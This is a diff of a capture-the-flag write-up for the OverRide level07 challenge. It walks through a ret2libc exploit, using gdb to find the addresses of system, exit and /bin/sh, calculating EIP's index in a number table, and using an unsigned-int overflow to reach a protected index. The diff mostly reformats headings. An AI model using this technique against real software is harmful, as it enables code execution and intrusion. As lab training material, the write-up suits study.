@@ -65,8 +65,9 @@ Our plan is to do a ret2libc attack, by overwriting the index containing EIP wit
 2) calculate the 'index' of EIP
 3) use maxint overflow to access protected indexes
 4) run exploit by inputting malicious number + index to running program
+<br />
 
-**step 1**
+**step 1** - find the address of system, exit, bin/sh
 ```
 level07@OverRide:~$ gdb -q level07
 
@@ -95,7 +96,7 @@ Ok, here are our addresses:
 - ```"/bin/sh"``` is at ```0xf7f897ec```
 <br />
 
-**step 2** <br />
+**step 2** <br /> - calculate the 'index' of EIP
 We need to find the index in the table where we reach EIP, and then store our payload there using ```store_number()```. 
 
 EIP's return address in the ```main()``` function is ```0xffffd6bc```.
@@ -108,7 +109,6 @@ Stack level 0, frame at 0xffffd6c0:
  Saved registers:
   eip at 0xffffd6bc
 ```
-
 The table's address is ```0xffffd4f4```.
 ```
 (gdb) b*store_number+6
@@ -121,9 +121,6 @@ $1 = (void *) 0xffffd4d0  # int *data
 (gdb) x/a 0xffffd4d0
 0xffffd4d0:	0xffffd4f4  # data[0]
 ```
-
-
-**Step 3** <br />
 Next, we need to calculate the 'index' of our EIP address. 
 ```
   0xffffd63c   -    0xffffd474    =    int(0x1c8)  =   456
@@ -135,6 +132,9 @@ Next, we need to calculate the 'index' of our EIP address.
 114 % 3 = 0
 ```
 Ah... index 114 is protected: ```114 % 3 = 0```. We can't store a number at this index. 
+
+
+**Step 3** <br /> - use maxint overflow to access protected indexes
 
 On lines 152-158 of the disassembled binary, we see that the table is accessed as ```data[index * 4]```. 
 Since the index is an unsigned int and multiplied by 4, we can overflow uintmax to give the index where we want to go. 
@@ -163,7 +163,8 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
 ```
 
-**Step 4** <br />
+**Step 4** <br /> - run exploit by inputting malicious number + index to running program
+
 Let's structure our exploit:
 ```
 [ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
@@ -173,9 +174,7 @@ Let's structure our exploit:
                         1073741938           115                    115                 # index to use
                         data[114]            data[115]              data[116]   
 ```
-
 Let's give it a go!
-
 ```
 level07@OverRide:~$ ./level07
 ----------------------------------------------------
